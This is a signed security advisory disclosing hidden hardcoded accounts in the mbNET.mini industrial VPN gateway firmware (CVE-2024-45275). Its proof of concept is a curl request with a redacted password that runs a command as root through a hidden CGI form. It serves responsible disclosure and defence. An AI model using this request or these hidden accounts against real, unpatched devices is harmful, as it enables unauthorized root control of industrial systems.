-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

Advisory ID:               SYSS-2024-064
Product:                   mbNET.mini
Manufacturer:              Red Lion Europe GmbH
Affected Version(s):       Firmware Versions: <= 2.2.13; 
                           other/similar devices are also affected 
                           (see manufacturer note[4])
Tested Version(s):         Firmware Version: 2.2.13, 2.2.11
Vulnerability Type:        Hidden Functionality (CWE-912)
Risk Level:                Medium
Solution Status:           Fixed
Manufacturer Notification: 2024-07-25
Solution Date:             2024-09-25
Public Disclosure:         2024-10-15
CVE Reference:             CVE-2024-45275
Author of Advisory:        Moritz Abrell, SySS GmbH

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Overview:

The mbNET.mini is a VPN gateway used for remote access and maintenance
in industrial environments.

The manufacturer describes the product as follows (see [1]):

"The mbNET industrial router is the ideal basis for securely connecting
your machines and systems to the Internet - for direct access or via
our remote service portal (my)mbCONNECT24."

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Vulnerability Details:

The firmware of the mbNET.mini contains two hidden accounts ("MBCL" and 
"remote") with hardcoded passwords. Those accounts are able to access 
the hidden HTTP forms "/cgi-bin/protect/system-config.sh" or
"/cgi-bin/control/remote-control.sh".

These forms, however, allow, e.g., executing commands with root
privileges, uploading firmware or setting configuration parameters.

The hidden accounts can be found in the file "/etc/rc.d/init.d/httpd".
This script writes the accounts and credentials in md5crypt format to 
"/tmp/httpd" and later to "/etc/httpd.conf".

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Proof of Concept (PoC):

$ curl -u remote:<redacted> http://192.168.0.100/cgi-bin/control/remote-control.sh\?wildcard=id
<html>
<head>
<title>remotecontrol</title>
</head>
<body>
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)

</body>
</html>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Solution:

Update the device according to the manufacturer note.[4]

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Disclosure Timeline:

2024-07-23: Vulnerability discovered
2024-07-25: Vulnerability reported to manufacturer
2024-07-25: Manufacturer confirmed reception
2024-07-31: Manufacturer asked for alternative publication date
2024-07-31: Asked the manufacturer for updates on the planned fixes
2024-08-02: Manufacturer responded that SYSS-2024-060 will not be fixed and
            a new "encryption" concept will be implemented for SYSS-2024-059
2024-09-10: Update of the vulnerability state and the planned fixes by 
            the manufacturer
2024-09-20: CVE IDs assigned by the manufacturer
2024-09-24: Committment of the publication date (2024-10-15)
2024-10-15: Public disclosure

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

References:

[1] mbNET product website
    https://mbconnectline.com/mbnet-en/
[2] SySS Security Advisory SYSS-2024-064
    https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2024-064.txt
[3] SySS Responsible Disclosure Policy
    https://www.syss.de/en/responsible-disclosure-policy
[4] Manufacturer note
    https://advisories.mbconnectline.com/pdf/SIM2024-04.pdf
[5] CVE-2024-45275
    https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-45275

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Credits:

This security vulnerability was found by Moritz Abrell of SySS GmbH.

E-Mail: moritz.abrell@syss.de
Public Key: https://www.syss.de/fileadmin/dokumente/PGPKeys/Moritz_Abrell.asc
Key Fingerprint: 2927 7EB6 1A20 0679 79E9  87E6 AE0C 9BF8 F134 8B53

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Disclaimer:

The information provided in this security advisory is provided "as is"
and without warranty of any kind. Details of this security advisory may
be updated in order to provide as accurate information as possible. The
latest version of this security advisory is available on the SySS website.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Copyright:

Creative Commons - Attribution (by) - Version 3.0
URL: http://creativecommons.org/licenses/by/3.0/deed.en
-----BEGIN PGP SIGNATURE-----

iQIzBAEBCgAdFiEEKSd+thogBnl56Yfmrgyb+PE0i1MFAmcGHjYACgkQrgyb+PE0
i1Pr6hAAg9ToSb3nNGi5VO7u1ZjnQ9gY3njKz8J/ZhzQd7D6hzjRoF2AZy6T9vG3
b0Ghl19Xbdy6T8K1/uz0TCXqlFYa4kSetB/oxOaKfvwa35LrTbHyGyGdBiXRtPWz
wmhRAYv7GxaEeXe9xnZW9TcqhlL6Lk3GcSjlDkwWBqgxEq3kZPiUSxyD9Ginwx7T
lMs/ErNynkS1Rkuod2Jiqu9pK2cvQV2lx4qzMqIjY84FMOJtC/Lm8gWFLzgqkdca
inh7aah7EVX7E5/aSzmXTb1n9zas9uw6vdiBi/bKfnYZq9va/HLEAfTwNqBZ4GQ4
HhC5M4r590703OV3bDjzGrqep0H7NSlGNCDgbPzK20XZ/ZOLb6owoAvBhmuDkFQD
1CmTpQYVmgoEqSzre8idc68Ks1WTDg/qWin2qRnpuEEED/YukK0VgjL5W+FlHvhv
/KdzZHgskUhDAPF9JsKp1GNyTgk8bjMRVfLtcbtYFRpklyYESVovUl3goNB2b47d
cHYF7uFEkYvDuVXFM/qTqOauXOicKZdsMugPhqtM/HhzMJzAXT62X2IKUgHzfGJ8
t5Pm/UMOxuBah2ZI+DJQmWMu+/L37kE87XBbVKyAhMu/pT3YP39e13rNGIQi2GrI
oZdL8Vm737g6NUz2m7nbBXVp/1owglqMFZPkwL8GNqznE8aSmpY=
=e06r
-----END PGP SIGNATURE-----
